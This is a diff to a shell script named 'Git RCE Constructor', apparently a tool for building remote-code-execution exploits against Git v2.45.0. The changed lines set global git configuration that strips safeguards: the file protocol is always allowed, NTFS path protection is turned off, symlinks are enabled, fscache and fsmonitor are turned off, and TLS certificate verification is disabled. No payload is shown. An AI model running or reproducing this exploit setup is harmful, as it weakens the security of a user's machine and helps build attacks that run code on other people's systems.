@@ -4,7 +4,7 @@ error_handler(){
 set +x
 echo -n "Operation failed!"
 read -N 1
-exit 0
+exit -1
 }
 echo Git RCE Constructor v1.9.0 \(Local Mode\)
 echo -e "\033]0;Git RCE Constructor v1.9.0 (Local Mode)\007"
@@ -12,8 +12,10 @@ echo Notice: You must use Git v2.45.0 for this exploit to work!
 set -x
 git config --global protocol.file.allow always ||error_handler
 git config --global core.protectNTFS false ||error_handler
-git config --global http.sslVerify false ||error_handler
 git config --global core.symlinks true ||error_handler
+git config --global core.fscache false ||error_handler
+git config --global core.fsmonitor false ||error_handler
+git config --global http.sslVerify false ||error_handler
 if [ -z "$(git config --global user.name)" ]; then
 git config --global user.name "$USERNAME"
 fi
